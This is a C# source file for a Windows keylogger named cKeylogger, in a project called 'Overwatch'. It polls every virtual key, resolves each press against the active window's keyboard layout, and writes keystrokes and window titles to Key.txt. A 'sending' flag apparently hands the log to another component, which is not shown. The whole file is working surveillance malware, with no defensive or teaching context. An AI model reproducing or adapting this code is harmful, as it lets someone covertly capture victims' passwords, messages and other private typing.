using System;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;

namespace Overwatch
{
    class cKeylogger
    {
        public static bool send = false;
        static appLog Log = new appLog();
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")]
        public static extern IntPtr GetWindowText(IntPtr hWnd, StringBuilder textOut, int count);
        [DllImport("user32.dll")]
        public static extern IntPtr GetKeyboardState(byte[] lpKeyState);
        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetKeyboardLayout(uint idThread);
        [DllImport("user32.dll", SetLastError = true)]
        static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, uint dwhkl);

        private const int MAX_STRING_BUILDER = 256;
        private const bool DEBUG = true;
        internal void Start()
        {
            try
            {
                string path = appConfing.targetDirPath + "\\Key.txt";
                using (StreamWriter writer = new StreamWriter(path, true))
                {
                    string tempWindowText, lastWindowText = "";
                    while (true)
                    {
                        if (cThread.sending)
                            break;
                        for (Int32 i = 0; i < 1000; i++)
                        {
                            tempWindowText = getCurrentWindowText();
                            if (lastWindowText != tempWindowText)
                            {
                                lastWindowText = tempWindowText;
                                writer.Write("BEGIN WINDOW: " + lastWindowText + "\n");
                            }
                            int value = GetAsyncKeyState(i);
                            if ((value & 0x8000) == 0 || (value & 0x1) == 0)
                                continue;
                            Keys key = (Keys)i;
                            switch (key)
                            {
                                case Keys.LButton:
                                case Keys.MButton:
                                case Keys.RButton:
                                case Keys.Back:
                                case Keys.ShiftKey:
                                case Keys.Shift:
                                case Keys.LShiftKey:
                                case Keys.RShiftKey:
                                case Keys.Capital:
                                    writer.Write(" [" + key.ToString() + "] ");
                                    break;
                                case Keys.Enter:
                                    writer.Write("\n");
                                    break;
                                case Keys.Space:
                                    writer.Write(" ");
                                    break;
                                case Keys.Tab:
                                    writer.Write("\t");
                                    break;
                                case Keys.Escape:
                                    break;
                                default:
                                    IntPtr hWindowHandle = GetForegroundWindow();
                                    uint dwThreadId = GetWindowThreadProcessId(hWindowHandle, out uint dwProcessId);
                                    byte[] kState = new byte[256];
                                    GetKeyboardState(kState); //retrieves the status of all virtual keys
                                    uint HKL = GetKeyboardLayout(dwThreadId); //retrieves the input locale identifier
                                    StringBuilder keyName = new StringBuilder();
                                    ToUnicodeEx((uint)i, (uint)i, kState, keyName, 16, 0, HKL);
                                    writer.Write(keyName.ToString());
                                    break;
                            }

                        }
                        writer.Flush();
                        System.Threading.Thread.Sleep(25);
                    }
                    writer.Close();
                }
            }
            catch (Exception ex) { Log.Write(ex.Message, true); }
        }

        private string getCurrentWindowText()
        {
            IntPtr handle = GetForegroundWindow();
            StringBuilder title = new StringBuilder(MAX_STRING_BUILDER);
            GetWindowText(handle, title, MAX_STRING_BUILDER); //return value > 0 if success
            return title.ToString();
        }
    }
}
